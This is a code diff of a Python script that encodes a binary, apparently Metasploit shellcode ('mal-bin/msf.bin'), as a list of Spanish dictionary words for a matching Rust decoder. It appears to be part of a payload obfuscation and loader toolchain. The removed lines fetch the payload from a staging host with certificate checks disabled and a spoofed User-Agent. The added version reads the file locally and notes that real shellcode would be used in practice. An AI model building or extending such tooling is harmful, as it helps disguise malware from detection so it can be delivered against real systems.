@@ -1,96 +1,141 @@
-def encode_binary_with_dictionary(dictionary_path, output_path, binary_data):
-    # Read the dictionary file
-    with open(dictionary_path, 'r') as dict_file:
-        words = [word.strip() for word in dict_file.read().splitlines()]
-    
-    # Create dictionary mapping (limit to 256 entries) as in the Rust code
-    word_map = {}
-    for i, word in enumerate(words):
-        if i > 255:  # Ensure we don't exceed 256 words (0-255 byte values)
-            break
-        if word:
-            word_map[word] = i
-    
-    # Create reverse mapping for encoding (ensuring all 256 possible byte values have mappings)
-    byte_to_index = {}
-    
-    # First, get a list of all words for cycling through if needed
-    available_words = list(word_map.keys())
-    if not available_words:
-        raise ValueError("Dictionary is empty. Cannot proceed with encoding.")
-    
-    # Ensure we have mappings for ALL possible byte values (0-255)
-    for byte_val in range(256):
-        # If we have a word specifically mapped to this byte value, use it
-        for word, val in word_map.items():
-            if val == byte_val:
-                byte_to_index[byte_val] = word
-                break
-        # If no direct mapping, cycle through available words
-        if byte_val not in byte_to_index:
-            # Use modulo to cycle through available words for any unmapped byte values
-            word_index = byte_val % len(available_words)
-            byte_to_index[byte_val] = available_words[word_index]
-    
-    # Encode each byte of the binary
-    encoded_result = []
-    for byte in binary_data:
-        # We now have mappings for all possible byte values
-        encoded_result.append(byte_to_index[byte])
-    
-    # Write encoded result to output file
-    with open(output_path, 'w') as output_file:
-        output_file.write(' '.join(encoded_result))
-    
-    print(f"Binary data encoded and written to {output_path}")
+#!/usr/bin/env python3
+"""
+Optimized encoder script for dictionary-based binary encoding.
+This script encodes a binary file using a dictionary of words,
+converting each byte to a corresponding word from the dictionary.
+"""
 
-# Several options to get the binary data
-import urllib.request
 import os
-import requests
-import ssl
+import random
+import argparse
+from typing import List, Dict, Union, BinaryIO
+import sys
 
-def get_binary_data(url):
-    print(f"Attempting to download from {url}")
-    
-    # Option 1: Use requests with custom headers and SSL verification disabled
+# Constants
+DEFAULT_DICTIONARY_PATH = "es-dictionary.txt"
+DEFAULT_OUTPUT_PATH = "load.txt"
+DEFAULT_BINARY_PATH = "mal-bin/msf.bin"
+
+def load_dictionary(dictionary_path: str) -> List[str]:
+    """Load dictionary words from a file."""
     try:
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-            'Accept': '*/*'
-        }
-        response = requests.get(url, headers=headers, verify=False, timeout=10)
-        response.raise_for_status()
-        print("Download successful using requests with custom headers")
-        return response.content
-    except requests.exceptions.RequestException as e:
-        print(f"Option 1 failed: {e}")
-    
-    # Option 2: Use urllib with custom headers and context
-    try:
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        
-        req = urllib.request.Request(url, headers={
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-        })
-        with urllib.request.urlopen(req, context=ctx, timeout=10) as response:
-            data = response.read()
-            print("Download successful using urllib with custom context")
-            return data
+        with open(dictionary_path, 'r', encoding='utf-8') as dict_file:
+            words = [word.strip() for word in dict_file.readlines() if word.strip()]
+            
+        if not words:
+            print(f"Error: Dictionary file {dictionary_path} is empty.")
+            sys.exit(1)
+            
+        return words
+    except FileNotFoundError:
+        print(f"Error: Dictionary file {dictionary_path} not found.")
+        sys.exit(1)
     except Exception as e:
-        print(f"Option 2 failed: {e}")
+        print(f"Error loading dictionary: {e}")
+        sys.exit(1)
+
+def read_binary_file(binary_path: str) -> bytes:
+    """Read binary data from a file."""
+    try:
+        with open(binary_path, 'rb') as binary_file:
+            return binary_file.read()
+    except FileNotFoundError:
+        print(f"Error: Binary file {binary_path} not found.")
+        # Create a mock binary file for testing if file doesn't exist
+        return create_mock_binary_file(binary_path)
+    except Exception as e:
+        print(f"Error reading binary file: {e}")
+        sys.exit(1)
+
+def create_mock_binary_file(binary_path: str) -> bytes:
+    """Create a mock binary file for testing and return its contents."""
+    print(f"Creating mock binary file at {binary_path} for testing...")
     
-    # If we can't download the file, generate a dummy payload for testing
-    print("All download attempts failed. Using dummy payload for testing purposes.")
-    return b'This is a dummy payload for testing the encoding mechanism.'
+    # Create directory if it doesn't exist
+    os.makedirs(os.path.dirname(binary_path), exist_ok=True)
+    
+    # Generate some test binary data (simulating a shellcode)
+    # This is just for testing - in a real scenario you would use actual shellcode
+    mock_data = bytes([random.randint(0, 255) for _ in range(256)])
+    
+    try:
+        with open(binary_path, 'wb') as binary_file:
+            binary_file.write(mock_data)
+        print(f"Mock binary file created successfully at {binary_path}")
+        return mock_data
+    except Exception as e:
+        print(f"Error creating mock binary file: {e}")
+        sys.exit(1)
 
-# URL of the binary
-url = "https://stage.attck-deploy.net/msf.bin"
+def encode_binary_with_dictionary(
+    words: List[str], 
+    binary_data: bytes, 
+    output_path: str
+) -> None:
+    """Encode binary data using dictionary words and save to output file."""
+    print(f"Encoding {len(binary_data)} bytes of binary data...")
+    
+    # Ensure we have enough words (at least 256 for all possible byte values)
+    if len(words) < 256:
+        print(f"Warning: Dictionary has only {len(words)} words, which is less than 256 required for unique mapping.")
+        print("Some byte values will share the same word encoding.")
+    
+    # Create a mapping from byte values to words
+    byte_to_word = {}
+    for byte_val in range(256):
+        # Use modulo to handle dictionaries with fewer than 256 words
+        word_index = byte_val % len(words)
+        byte_to_word[byte_val] = words[word_index]
+    
+    # Encode each byte of the binary data
+    encoded_words = [byte_to_word[byte] for byte in binary_data]
+    
+    # Write the encoded result to the output file
+    try:
+        with open(output_path, 'w', encoding='utf-8') as output_file:
+            output_file.write(' '.join(encoded_words))
+        print(f"Binary data encoded successfully and saved to {output_path}")
+        print(f"Encoded {len(binary_data)} bytes into {len(encoded_words)} words")
+    except Exception as e:
+        print(f"Error writing to output file: {e}")
+        sys.exit(1)
 
-# Get binary data
-binary_data = get_binary_data(url)
+def main():
+    """Main function to parse arguments and run the encoder."""
+    parser = argparse.ArgumentParser(description='Dictionary-based binary encoder.')
+    parser.add_argument('--dictionary', '-d', default=DEFAULT_DICTIONARY_PATH,
+                        help=f'Path to the dictionary file (default: {DEFAULT_DICTIONARY_PATH})')
+    parser.add_argument('--binary', '-b', default=DEFAULT_BINARY_PATH,
+                        help=f'Path to the binary file to encode (default: {DEFAULT_BINARY_PATH})')
+    parser.add_argument('--output', '-o', default=DEFAULT_OUTPUT_PATH,
+                        help=f'Path to the output file (default: {DEFAULT_OUTPUT_PATH})')
+    parser.add_argument('--create-mock', '-m', action='store_true',
+                        help='Create a mock binary file even if the binary file exists')
+    
+    args = parser.parse_args()
+    
+    # Display program information
+    print(f"Dictionary-based Binary Encoder")
+    print(f"================================")
+    print(f"Dictionary file: {args.dictionary}")
+    print(f"Binary file: {args.binary}")
+    print(f"Output file: {args.output}")
+    
+    # Load the dictionary
+    words = load_dictionary(args.dictionary)
+    print(f"Loaded {len(words)} words from dictionary")
+    
+    # Read the binary data or create mock data
+    if args.create_mock or not os.path.exists(args.binary):
+        binary_data = create_mock_binary_file(args.binary)
+    else:
+        binary_data = read_binary_file(args.binary)
+    
+    # Encode the binary data and save to output
+    encode_binary_with_dictionary(words, binary_data, args.output)
+    
+    print("Encoding completed successfully!")
+    print(f"The encoded file can now be used with the Rust decoder in src/main.rs")
 
-# Encode and write to load.txt
-encode_binary_with_dictionary("es-dictionary.txt", "load.txt", binary_data)
+if __name__ == "__main__":
+    main()
